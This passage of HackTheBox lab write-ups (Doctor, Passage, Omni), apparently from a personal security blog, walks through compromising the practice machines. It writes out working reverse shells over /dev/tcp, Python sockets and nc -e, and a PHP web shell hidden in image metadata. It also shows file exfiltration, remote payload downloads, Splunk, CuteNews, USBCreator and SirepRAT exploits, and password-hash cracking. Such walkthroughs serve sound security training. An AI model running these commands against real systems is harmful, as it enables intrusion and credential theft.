(UNKNOWN) [10.10.10.209] 5628 /bin/sh: 0: can’t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; web@doctor:~$ id uid=1001(web) gid=1001(web) groups=1001(web),4(adm) Privilege Escalation Shell as shaun Internal Enumeration These are the users who a shell.\nweb@doctor:~$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash web:x:1001:1001:,,,:/home/web:/bin/bash shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash Because web is a member of the adm group, I can read the log files at /var/log. While enumerating with find command, I caught an Apache2 log called \u0026ldquo;backup\u0026rdquo;.\nweb@doctor:~$ find / -type f -readable -group adm 2\u0026gt;/dev/null /var/log/kern.log.3.gz /var/log/auth.log /var/log/syslog /var/log/ufw.log.2.gz /var/log/dmesg.2.gz /var/log/auth.log.1 ...\u0026lt;SNIP\u0026gt;... /var/log/apache2/backup Searching string \u0026ldquo;pass\u0026rdquo; on the backup log finds this line.\nweb@doctor:/var/log/apache2$ cat backup | grep pass 10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] \u0026#34;POST /reset_password?email=Guitar123\u0026#34; 500 453 \u0026#34;http://doctor.htb/reset_password\u0026#34; It printed as email=Guitar123, but it doesn\u0026rsquo;t look like an email.\nSU - shaun It turns out that Guitar123 is shaun\u0026rsquo;s password.\nweb@doctor:/var/log/apache2$ su shaun Password: Guitar123 web@doctor:/var/log/apache2$ id uid=1002(shaun) gid=1002(shaun) groups=1002(shaun) User flag is done here.\nShell as root Exploiting Splunk with PySplunkWhisperer2 Recall the Splunk Forwarder, which by BookHackTrick is categorized as a privilege escalation vector.\nThe researcher stated that the Splunk UF agent\u0026rsquo;s username is always admin.\n Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 \u0026hellip;\n But that\u0026rsquo;s not the case on this machine, because I can use shaun:Guitar123 to authenticate to the Splunk UF services on port 8089.\nI tried this PoC from GitHub using the bash reverse shell as payload,\n→ root@kali «exploits» «10.10.14.3» $ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.3/9001 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; --lhost 10.10.14.3 Running in remote mode (Remote Code Execution) [.] Authenticating... [+] Authenticated [.] Creating malicious app bundle... [+] Created malicious app bundle in: /tmp/tmpkwnss3rw.tar [+] Started HTTP server for remote mode [.] Installing app from: http://10.10.14.3:8181/ 10.10.10.209 - - [03/Feb/2021 05:09:23] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - [+] App installed, your code should be running now! and it worked smoothly.\n→ root@kali «doctor» «10.10.14.3» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.10.209] 48834 bash: cannot set terminal process group (1137): Inappropriate ioctl for device bash: no job control in this shell root@doctor:/# id id uid=0(root) gid=0(root) groups=0(root) I can grab the root flag.\n  References  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2 https://www.youtube.com/watch?v=SN6EVIG4c-0 https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-doctor/","summary":"Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I\u0026rsquo;m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user\u0026rsquo;s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.\nSkills Learned  Server Side Template Injection Splunk UF Exploitation  Tools   Kali Linux (Attacking Machine) - https://www.","tags":["OSCP-like","Linux","SSTI","Splunk"],"title":"HackTheBox - Doctor"},{"content":"Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user. There is an unpatched package called USBCreator that allows an attacker to perform Arbitrary File Write as root without supplying a password.\nSkills Learned   CuteNews 2.1.2 exploitation\n  USBCreator D-bus exploitation\n  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux hashcat (Windows) - https://hashcat.net/hashcat/ Exiftool - https://exiftool.org/ gdbus - Preinstalled in the target machine.  Reconnaissance Nmap An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.\n→ root@kali «passage» «10.10.14.31» $ mkdir nmap; nmap -sC -sV -oN initial-passage -v 10.10.10.206 # Nmap 7.80 scan initiated Sat Sep 5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206 Nmap scan report for 10.10.10.206 Host is up (0.074s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel As SSH usually requires credentials, I\u0026rsquo;ll enumerate the web server on port 80.\nEnumeration TCP 80 - Website The page presenting a kind of news website called \u0026ldquo;Passage News\u0026rdquo;.\n The post titled \u0026ldquo;Implemented Fail2Ban\u0026rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.\n Inspecting the page sources finds a directory called \u0026ldquo;CuteNews\u0026rdquo;. I also find the hostname as passage.htb.\n Adding /CuteNews to the URL redirects me to a login page.\n I can register as normal user.\n Searchsploit I threw \u0026ldquo;CuteNews 2.1.2\u0026rdquo; to searchsploit and it returned several exploits.\n→ root@kali «passage» «10.10.14.31» $ searchsploit \u0026#39;CuteNews 2.1.2\u0026#39; ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- CuteNews 2.1.2 - \u0026#39;avatar\u0026#39; Remote Code Execution (Metasploit) | php/remote/46698.rb CuteNews 2.1.2 - Arbitrary File Deletion | php/webapps/48447.txt CuteNews 2.1.2 - Authenticated Arbitrary File Upload | php/webapps/48458.txt ------------------------------------------------------------------- --------------------------------- I\u0026rsquo;ll go with the \u0026lsquo;avatar\u0026rsquo; RCE.\nFoothold Shell as www-data CuteNews CVE-2019-11447 It turns out the \u0026lsquo;avatar\u0026rsquo; RCE exploit was a CVE. The exploit module description as follows:\n This module exploits a command execution vulnerability in CuteNews prior to 2.1.2. The attacker can infiltrate the server through the avatar upload process in the profile area. There is no realistic control of the $imgsize function in \u0026ldquo;/core/modules/dashboard.php\u0026rdquo; Header content of the file can be changed and the control can be bypassed. We can use the \u0026ldquo;GIF\u0026rdquo; header for this process. An ordinary user is enough to exploit the vulnerability. No need for admin user. The module creates a file for you and allows RCE.\n I can also exploit this manually.\nI still have the payload that I made using exiftool in my previous Magic write-up. If I don\u0026rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.\n→ root@kali «passage» «10.10.14.31» $ exiftool -Comment=\u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; iamf.jpg I\u0026rsquo;ll rename my jpeg image to iamfr.php, and then I\u0026rsquo;ll upload it as my avatar (Dashboard \u0026ndash;\u0026gt; Personal Options).\n The image is located at http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php\nI\u0026rsquo;ll send a Python reverse shell through the web shell and capture it on my nc listener.\nhttp://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd=python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.14.31\u0026#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; I have an interactive shell now.\n→ root@iamf «passage» «10.10.14.31» $ rlwrap nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.206] 37062 bash: cannot set terminal process group (1678): Inappropriate ioctl for device bash: no job control in this shell www-data@passage:/var/www/html/CuteNews/uploads$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@passage:/var/www/html/CuteNews/uploads$ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@passage:/var/www/html/CuteNews/uploads$ www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm-256color Privilege Escalation Shell as paul Internal Enumeration There are two users in home directory.\nwww-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home ls -l /home total 8 drwxr-x--- 17 nadav nadav 4096 Mar 5 09:21 nadav drwxr-x--- 17 paul paul 4096 Mar 5 08:32 paul On /var/www/html/CuteNews/cdata/users, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.\n  Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.\n I\u0026rsquo;ll send those files to my machine as one file using cat and dev/tcp trick\nwww-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php \u0026gt; /dev/tcp/10.10.14.31/9000 I redirected it to a file called cdata.users.\n→ root@iamf «passage» «10.10.14.31» $ nc -nvlp 9000 \u0026gt; cdata.users listening on [any] 9000 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.206] 55022 I can perform a bulk decode on the file contents after removing the PHP tags.\n→ root@iamf «passage» «10.10.14.31» $ cat cdata.users| sed \u0026#39;s/\u0026lt;?php[^\u0026gt;]*\u0026gt;//g\u0026#39; | base64 -d cat cdata.users| sed \u0026#39;s/\u0026lt;?php[^\u0026gt;]*\u0026gt;//g\u0026#39; | base64 -d a:1:{s:5:\u0026#34;email\u0026#34;;a:1:{s:16:\u0026#34;paul@passage.htb\u0026#34;;s:10:\u0026#34;paul-coles\u0026#34;;}}a:1:{s:2:\u0026#34;id\u0026#34;;a:1:{i:1598829833;s:6:\u0026#34;egre55\u0026#34;;}}a:1:{s:5:\u0026#34;email\u0026#34;;a:1:{s:15:\u0026#34;ahaha@gmail.com\u0026#34;;s:8:\u0026#34;ivanpogi\u0026#34;;}}a:2:{s:5:\u0026#34;email\u0026#34;;a:1:{s:15:\u0026#34;egre55@test.com\u0026#34;;s:6:\u0026#34;egre55\u0026#34;;}s:4:\u0026#34;name\u0026#34;;a:1:{s:4:\u0026#34;debo\u0026#34;;a:11:{s:2:\u0026#34;id\u0026#34;;s:10:\u0026#34;1599412470\u0026#34;;s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;debo\u0026#34;;s:3:\u0026#34;acl\u0026#34;;s:1:\u0026#34;4\u0026#34;;s:5:\u0026#34;email\u0026#34;;s:13:\u0026#34;debo@debo.com\u0026#34;;s:4:\u0026#34;nick\u0026#34;;s:4:\u0026#34;debo\u0026#34;;s:4:\u0026#34;pass\u0026#34;;s:64:\u0026#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52\u0026#34;;s:4:\u0026#34;more\u0026#34;;s:60:\u0026#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==\u0026#34;;s:6:\u0026#34;avatar\u0026#34;;s:20:\u0026#34;avatar_debo_bash.php\u0026#34; ...\u0026lt;SNIP\u0026gt;... And that was a mess.\nAmong those outputs, this one concerns me.\n\u0026quot;pass\u0026quot;;s:64:\u0026quot;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52\u0026quot; hash-identifier identifies it as SHA-256.\n→ root@kali «passage» «192.168.43.234» $ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068 ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /\u0026#39;__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # ######################################################################### -------------------------------------------------- Possible Hashs: [+] SHA-256 [+] Haval-256 ...\u0026lt;SNIP\u0026gt;... It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like /etc/passwd).\n Knowing that, I can add another filter using grep to grab the password hashes.\n→ root@kali «passage» «192.168.43.234» $ cat cdata.users| sed \u0026#39;s/\u0026lt;?php[^\u0026gt;]*\u0026gt;//g\u0026#39; | base64 -d | grep -o -E -e \u0026#34;[0-9a-f]{64}\u0026#34; b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426 41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9 59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4 Cracking the Hashes hashcat recovered five passwords.\n$ ./hashcat.exe -m 1400 hashes/passage.hashes ../rockyou.txt -O --show b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1 e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker 59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario SU - paul I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with su, and password atlanta1 worked on paul.\nwww-data@passage:/home$ su paul su paul Password: atlanta1 paul@passage:~$ Shell as nadav Escalating from paul to nadav is pretty straight forward, I found out that user nadav uses the same SSH keys as user paul.\npaul@passage:~/.ssh$ cat id_rsa.pub \u0026amp;\u0026amp; authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage So I can just SSH from paul to nadav.\npaul@passage:~/.ssh$ ssh nadav@passage.htb Last login: Sun Sep 6 11:12:03 2020 from 127.0.0.1 nadav@passage:~$ id id uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) Shell as root Internal enumeration Since nadav is a member of the sudo group, I can just type sudo su to escalate to root, but unfortunately it requires nadav\u0026rsquo;s password.\nSo I looking around nadav\u0026rsquo;s home directory, and there is a .viminfo file.\n The file contains the following information.\n...\u0026lt;SNIP\u0026gt;... # Command Line History (newest to oldest): :wq :%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g ...\u0026lt;SNIP\u0026gt;... # File marks: \u0026#39;0 12 7 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u0026#39;1 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf # Jumplist (newest first): -\u0026#39; 12 7 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -\u0026#39; 1 0 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf -\u0026#39; 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -\u0026#39; 1 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -\u0026#39; 2 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf -\u0026#39; 1 0 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf # History of marks within files (newest to oldest): \u0026gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u0026#34; 12 7 \u0026gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf \u0026#34; 2 0 . 2 0 + 2 0 The history of files points to these two configuration files:\n /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf  The 51-ubuntu-admin.conf defines there are only two groups that can be used for authentication when administrator authentication is needed, sudo and admin. This file is used by Polkit, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.\nnadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf [Configuration] AdminIdentities=unix-group:sudo;unix-group:admin I don\u0026rsquo;t really understand in depth about com.ubuntu.USBCreator.conf. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the sudo or the admin group (defined by the 51-ubuntu-admin.conf file)\nnadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf \u0026lt;!DOCTYPE busconfig PUBLIC \u0026#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\u0026#34; \u0026#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026#34;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;!-- Only root can own the service --\u0026gt; \u0026lt;policy user=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;allow own=\u0026#34;com.ubuntu.USBCreator\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;!-- Allow anyone to invoke methods (further constrained by PolicyKit privileges --\u0026gt; \u0026lt;policy context=\u0026#34;default\u0026#34;\u0026gt; \u0026lt;allow send_destination=\u0026#34;com.ubuntu.USBCreator\u0026#34; send_interface=\u0026#34;com.ubuntu.USBCreator\u0026#34;/\u0026gt; \u0026lt;allow send_destination=\u0026#34;com.ubuntu.USBCreator\u0026#34; send_interface=\u0026#34;org.freedesktop.DBus.Introspectable\u0026#34;/\u0026gt; \u0026lt;allow send_destination=\u0026#34;com.ubuntu.USBCreator\u0026#34; send_interface=\u0026#34;org.freedesktop.DBus.Properties\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt; From here, From here, it looks only nadav that can invoke the methods of this service\nUSBCreator D-Bus Interface Vulnerability There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation1. The research summary as follows:\n\u0026ldquo;A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu patched the relevant packages in response to a vulnerability disclosure from Unit 42.\u0026rdquo;\nThe bug was first reported in 20162, and the affected Ubuntu version is 16.04.\n The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.\nnadav@passage:~$ uname -a Linux passage 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Overwrite authorized_keys One of the tools used by the researcher to exploit the vulnerability is a CLI-based called gdbus.\nWith user nadav, I can try to overwrite the authorized_keys file contents in the root directory with my public key.\nI\u0026rsquo;ll put my public key named key in /dev/shm/, and then I\u0026rsquo;ll invoke the following command:\nnadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys true true () I tried to login as root using my private key, and it worked.\n→ root@kali «passage» «10.10.14.31» $ ssh -i root_rsa root@10.10.10.206 Last login: Fri Mar 5 17:33:39 2020 from 10.10.14.7 root@passage:~# ls -l total 12 drwxr-xr-x 2 root root 4096 Jul 21 2020 exploits drwxr-xr-x 2 root root 4096 Jul 21 2020 exploits -r-------- 1 root root 33 Mar 5 17:05 root.txt root@passage:~#   https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-passage/","summary":"Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user.","tags":["OSCP-like","Linux","CVE-2019-11447","Webshell","SSH-key-reuse","Password-cracking","USBCreator","gdbus","Arbitrary-file-write"],"title":"HackTheBox - Passage"},{"content":"Omni is an easy difficulty machine from HackTheBox that runs the IoT version of Windows 10. The machine is known to be vulnerable to SirepRAT, allowing an attacker to gain a remote code execution as SYSTEM. Leveraging the RAT, I\u0026rsquo;m able to gain a foothold on the system and obtain two set of credentials that can be used to decrypt the encrypted flags.\nSkills Learned  Exploiting Windows IoT Decrypting PSCredential object  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux SirepRAT - https://github.com/SafeBreach-Labs/SirepRAT  Reconnaissance Nmap An initial port scan using nmap discovers two open ports: MSRPC on port 135, and a Microsoft IIS on port 8080.\n→ root@iamf «omni» «10.10.14.47» $ nmap -sC -sV -oN nmap/initial-omni -v \u0026#39;10.10.10.204\u0026#39; # Nmap 7.80 scan initiated Sun Aug 23 09:25:53 2020 as: nmap -sC -sV -oN nmap/initial-omni -v 10.10.10.204 Nmap scan report for 10.10.10.204 Host is up (0.056s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8080/tcp open upnp Microsoft IIS httpd | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Windows Device Portal |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn’t have a title. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Enumeration TCP 8080 - Website Based on the nmap\u0026rsquo;s result, authentication process is required to view the page content, and looks like it uses the basic HTTP authentication.\n With default script (-sC), nmap can retrieves the authentication scheme and realm of a web service that requires authentication.\n nmap identifies the realm as \u0026ldquo;Windows Device Portal\u0026rdquo;, and here is what I found on Google.\n According to the table from this documentation, Windows Device Portal (WDP) on port 8080 belongs to the IoT family, which means this machine is most likely running a Windows 10 IoT version.\n So, without credentials, I can\u0026rsquo;t do anything here.\nFoothold There is a research about unauthenticated remote code execution on Windows IoT Core. The research documents (slides, paper) as well as the exploit tool are provided in the link below.\n https://github.com/SafeBreach-Labs/SirepRAT/  Shell as Omni$ SirepRAT RCE The exploit tool is work against this machine, and I can get a remote code execution as Omni$ / SYSTEM.\nTo get an interactive shell, I\u0026rsquo;ll host Windows nc64.exe using Python HTTP server.\n→ root@iamf «omni» «10.10.14.47» $ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... I\u0026rsquo;ll get the hosted netcat on Omni using PowerShell Invoke-WebRequest command by leveraging the SirepRAT RCE.\n→ root@iamf «omni» «10.10.14.47» $ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#34;/c powershell -c Invoke-webrequest -uri 10.10.14.68/nc64.exe -outfile U:\\Users\\Public\\xc.exe\u0026#34; --vv RECV: 00000000: 2A 4C 59 A5 FB 60 04 47 A9 6D 1C C9 7D C8 4F 12 *LY..`.G.m..}.O. SEND: 00000000: 0A 00 00 00 12 01 00 00 01 00 00 00 01 00 00 00 ................ 00000010: 24 00 00 00 36 00 00 00 5A 00 00 00 B8 00 00 00 $...6...Z....... 00000020: 12 01 00 00 00 00 00 00 00 00 00 00 43 00 3A 00 ............C.:. 00000030: 5C 00 57 00 69 00 6E 00 64 00 6F 00 77 00 73 00 \\.W.i.n.d.o.w.s. 00000040: 5C 00 53 00 79 00 73 00 74 00 65 00 6D 00 33 00 \\.S.y.s.t.e.m.3. 00000050: 32 00 5C 00 63 00 6D 00 64 00 2E 00 65 00 78 00 2.\\.c.m.d...e.x. 00000060: 65 00 2F 00 63 00 20 00 70 00 6F 00 77 00 65 00 e./.c. .p.o.w.e. 00000070: 72 00 73 00 68 00 65 00 6C 00 6C 00 20 00 2D 00 r.s.h.e.l.l. .-. 00000080: 63 00 20 00 49 00 6E 00 76 00 6F 00 6B 00 65 00 c. .I.n.v.o.k.e. 00000090: 2D 00 77 00 65 00 62 00 72 00 65 00 71 00 75 00 -.w.e.b.r.e.q.u. 000000A0: 65 00 73 00 74 00 20 00 2D 00 75 00 72 00 69 00 e.s.t. .-.u.r.i. 000000B0: 20 00 31 00 30 00 2E 00 31 00 30 00 2E 00 31 00 .1.0...1.0...1. 000000C0: 34 00 2E 00 34 00 37 00 2F 00 6E 00 63 00 36 00 4...4.7./.n.c.6. 000000D0: 34 00 2E 00 65 00 78 00 65 00 20 00 2D 00 6F 00 4...e.x.e. .-.o. 000000E0: 75 00 74 00 66 00 69 00 6C 00 65 00 20 00 55 00 u.t.f.i.l.e. .U. 000000F0: 3A 00 5C 00 55 00 73 00 65 00 72 00 73 00 5C 00 :.\\.U.s.e.r.s.\\. 00000100: 70 00 75 00 62 00 6C 00 69 00 63 00 5C 00 78 00 p.u.b.l.i.c.\\.x. 00000110: 63 00 2E 00 65 00 78 00 65 00 c...e.x.e. RECV: 00000000: 00 00 00 00 .... \u0026lt;HResultResult | type: 1, payload length: 4, HResult: 0x0\u0026gt; After that, I\u0026rsquo;ll setup a listener, and send a reverse shell to my listener from Omni.\n→ root@iamf «omni» «10.10.14.47» $ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; --args \u0026#34;/c U:\\Users\\public\\xc.exe -e cmd.exe 10.10.14.47 1337 \u0026lt;HResultResult | type: 1, payload length: 4, HResult: 0x0 And I have interactive shell now.\n→ root@iamf «omni» «10.10.14.47» $ rlwrap nc -nvlp 1337 listening on [any] 1337 ... connect to [10.10.14.47] from (UNKNOWN) [10.10.10.204] 49689 Microsoft Windows [Version 10.0.17763.107] Copyright (c) Microsoft Corporation. All rights reserved. PS C:\\windows\\system32\u0026gt;$env:username Omni$ Internal Enumeration Enumerating for the flags finds they are located at C:\\Data\\Users\\administrator\\root.txt and 